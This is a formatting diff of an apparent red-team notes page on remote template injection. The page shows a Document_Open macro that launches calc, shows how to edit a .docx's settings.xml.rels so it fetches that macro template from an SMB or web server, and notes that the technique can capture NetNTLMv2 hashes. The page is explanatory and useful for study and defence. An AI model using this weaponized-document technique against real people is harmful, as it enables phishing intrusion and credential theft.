@@ -17,8 +17,8 @@ This technique works in the following way:
 
 Alt+F8 to enter Dev mode where we can edit Macros, select `ThisDocument` and paste in:
 
-{% code title="Doc3.dotm" %}
 ```javascript
+// Doc3.dotm
 Sub Document_Open()
 
 Set objShell = CreateObject("Wscript.Shell")
@@ -26,46 +26,43 @@ objShell.Run "calc"
 
 End Sub
 ```
-{% endcode %}
 
-![](<../../../.gitbook/assets/Screenshot from 2019-03-18 22-19-22.png>)
+![[Screenshot from 2019-03-18 22-19-22.png]]
 
 Create a benign .docx file based on one of the provided templates and save it as .docx:
 
-![](<../../../.gitbook/assets/Screenshot from 2019-03-18 22-24-02.png>)
+![[Screenshot from 2019-03-18 22-24-02.png]]
 
 Rename legit.docx to legit.zip:
 
-![](<../../../.gitbook/assets/Screenshot from 2019-03-18 22-26-41.png>)
+![[Screenshot from 2019-03-18 22-26-41.png]]
 
 Unzip the archive and edit `word_rels\settings.xml.rels`:
 
-{% code title="word_rels\settings.xml.rels" %}
 ```markup
+// word_rels\settings.xml.rels
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx" TargetMode="External"/></Relationships>
 ```
-{% endcode %}
 
 Note it has the target template specified here:
 
-![](<../../../.gitbook/assets/Screenshot from 2019-03-18 22-36-30.png>)
+![[Screenshot from 2019-03-18 22-36-30.png]]
 
 Upload the template created previously `Doc3.dot` to an SMB server (note that the file could be hosted on a web server also!).
 
 Update word\_rels\settings.xml.rels to point to Doc3.dotm:
 
-![](<../../../.gitbook/assets/Screenshot from 2019-03-18 22-59-07.png>)
+![[Screenshot from 2019-03-18 22-59-07.png]]
 
 Zip all the files of `legit` archive and name it back to .docx - we now have a weaponized document:
 
-![](<../../../.gitbook/assets/Peek 2019-03-18 23-07.gif>)
+![[Peek 2019-03-18 23-07.gif]]
 
-{% hint style="info" %}
-Note that this technique could be used to steal NetNTLMv2 hashes since the target system is connecting to the attacking system - a responder can be listening there.
-{% endhint %}
+> [!INFO]
+> Note that this technique could be used to steal NetNTLMv2 hashes since the target system is connecting to the attacking system - a responder can be listening there.
 
 ## References
 
-{% embed url="http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html" %}
+[blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)
 
